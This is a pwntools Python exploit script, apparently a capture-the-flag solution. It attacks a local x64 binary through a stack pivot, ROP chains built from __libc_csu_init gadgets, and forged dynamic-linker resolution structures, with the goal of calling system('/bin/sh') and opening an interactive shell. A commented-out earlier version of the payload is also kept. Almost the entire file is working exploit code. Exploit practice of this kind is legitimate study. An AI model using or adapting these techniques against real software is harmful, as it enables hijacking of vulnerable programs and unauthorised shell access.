#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./partial_x64')
elf = ELF('./partial_x64')

write_got = elf.got['write']
read_got = elf.got['read']
memcpy_got = elf.got['memcpy']
gmon_start_plt = elf.plt['__gmon_start__']
plt0 = 0x400490
got1 = 0x601008

buf = 0x601080
leave_ret = 0x0000000000400635
pop_rdi_ret = 0x00000000004006a3

# readelf -a ./partial_x64 | grep .dynamic
#   [21] .dynamic          DYNAMIC          0000000000600e28  00000e28
dynamic = 0x0000000000600e28
# readelf -a ./partial_x64 | grep .rela.plt
#   [10] .rela.plt         RELA             00000000004003f8  000003f8
relplt = 0x00000000004003f8
# readelf -a ./partial_x64 | grep SYMTAB
#  0x0000000000000006 (SYMTAB)             0x4002b8
dynsym = 0x4002b8
# readelf -a ./partial_x64 | grep STRTAB
#  0x0000000000000005 (STRTAB)             0x400348
dynstr = 0x400348

#gdb.attach(p, 'b *0x400636\nb *0x400689\nc')

def csu(func, rdi, rsi, rdx):
	payload = (
		p64(0x40069a) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) + 
		p64(0x400680) + 56 * '\x00'
	)
	return payload

def memcpy(dst, src, length): # dst=>+48 ; src=>+40
	return csu(memcpy_got, dst, src, length)

def write(fd, buf, nbytes): # buf=>+40
	return csu(write_got, fd, buf, nbytes)

def read(fd, buf, nbytes): # buf=>+40
	return csu(read_got, fd, buf, nbytes)

'''
reloc_arg = (buf + 2048 + 16 - relplt) / 24
payload = (
	((
		'A' * 14 + # padding
		p64(buf + 1024 - 8) + # set rbp=buf+1024-8
		p64(leave_ret) # stack pivot ; set rsp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120
		write(1, 0, 0x1c8+8) + # buf+1024+240
		memcpy(buf + 1024 + 400, got1, 8) + # buf+1024+360
		read(0, 0, 0x1c8+8) + # buf+1024+480 ; l->l_info[VERSYMIDX (DT_VERSYM)]=NULL
		p64(pop_rdi_ret) +
		p64(buf + 2048 + 56) +
		p64(plt0) +
		p64(reloc_arg) # set reloc_arg
	).ljust(2048, '\x00') +  # buf+2048
	16 * '\x00' + # padding
	# Elf64_Rela
	p64(buf) + # r_offset
	p64(0x7 | (((buf + 2048 + 32 - dynsym) / 24) << 32)) + # r_info
	# Elf64_Sym <= buf+2048+32
	p32(buf + 2048 + 48 - dynstr) + # st_name
	p32(0x12) + # st_info
	p32(0) +
	p32(0) +
	# buf+2048+48
	'system\x00\x00' +
	'/bin/sh\x00'
)
p.recvuntil('> ')
p.sendline(payload)
data = p.recv(0x1c8+8)
raw_input('@')
payload = data[:-8] + p64(0)
p.sendline(payload)
'''

st_name = 0x2f
payload = (
	((
		'A' * 14 + # padding
		p64(buf + 1024 - 8) + # set rbp=buf+1024-8
		p64(leave_ret) # stack pivot ; set rsp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120
		memcpy(buf, 0, 112) + # buf+1024+240
		memcpy(buf + 104, buf + 2048, 8) + # buf+1024+360
		write(1, buf, 112) + # buf+1024+480
		memcpy(buf + 1024 + 640, got1, 8) + # buf+1024+600
		read(0, 0, 112) + # buf+1024+720
		p64(pop_rdi_ret) +
		p64(buf + 2048 + 32) +
		p64(gmon_start_plt)
	).ljust(2048, '\x00') + # buf+2048
	p64(buf + 2048 + 8) +
	p64(5) +
	p64(buf + 2048 + 24 - st_name) +
	# data+24
	'system\x00\x00' +
	'/bin/sh\x00'
)
p.recvuntil('> ')
p.sendline(payload)
data = p.recv(112)
raw_input('@')
payload = data
p.sendline(payload)

p.interactive()

